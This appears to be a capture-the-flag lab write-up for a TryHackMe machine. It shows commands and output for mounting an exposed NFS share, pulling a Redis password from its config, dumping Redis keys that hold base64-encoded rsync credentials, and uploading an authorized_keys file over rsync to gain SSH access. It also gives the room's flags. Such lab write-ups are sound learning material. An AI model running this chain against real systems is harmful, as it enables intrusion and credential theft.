# Vulnet_Internal 

> VOiD | Tuesday 07 December 2021 04:37:24 AM UTC

My IP : 10.8.253.221
Target IP : 



## PORT 2049 [nfs]
```bash
sudo mount -t nfs 10.10.153.254:/opt/conf opt/conf

cat redis.conf | grep pass
# 2) No password is configured.
# If the master is password protected (using the "requirepass" configuration
# masterauth <master-password>
requirepass "B65Hx562F@ggAZ@F"

```

## PORT 6379 [Redis]
```bash
redis-cli -h 10.10.153.254 -a B65Hx562F@ggAZ@F

10.10.153.254:6379> KEYS *
1) "internal flag"
2) "int"
3) "authlist"
4) "marketlist"
5) "tmp"

10.10.153.254:6379> GET "internal flag"
"THM{ff8e518addbbddb74531a724236a8221}"
10.10.153.254:6379> GET "int"
"10 20 30 40 50"
10.10.153.254:6379> GET "authlist"
(error) WRONGTYPE Operation against a key holding the wrong kind of value
10.10.153.254:6379> GET "marketlist"
(error) WRONGTYPE Operation against a key holding the wrong kind of value
10.10.153.254:6379> GET "tmp"
"temp dir..."
10.10.153.254:637

10.10.153.254:6379> TYPE "authlist"
list
(0.55s)
10.10.153.254:6379> LRANGE "authlist" 1 100
1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
3) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="

Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
```
 
## PORT 873 [rsync]
```bash
rsync -rdt rsync://10.10.153.254:873     
files          	Necessary home interaction

rsync -av rsync://10.10.153.254:873/files ./rsync
rsync -av rsync://rsync-connect@10.10.149.247/files ./rsync
           
copy my authorized_keys to machine
sync -a /home/kali/.ssh/authorized_keys rsync://rsync-connect@'machine-ip'/files/sys-internal/.ssh/                          
```


## USER [sys-internal]
```bash
THM{da7c20696831f253e0afaca8b83c07ab}

ssh -i id_rsa sys-internal@10.10.149.247 -L 80:localhost:8111

super user token : 1618253698136688570

bash-4.4# cat root.txt 
THM{e8996faea46df09dba5676dd271c60bd}

```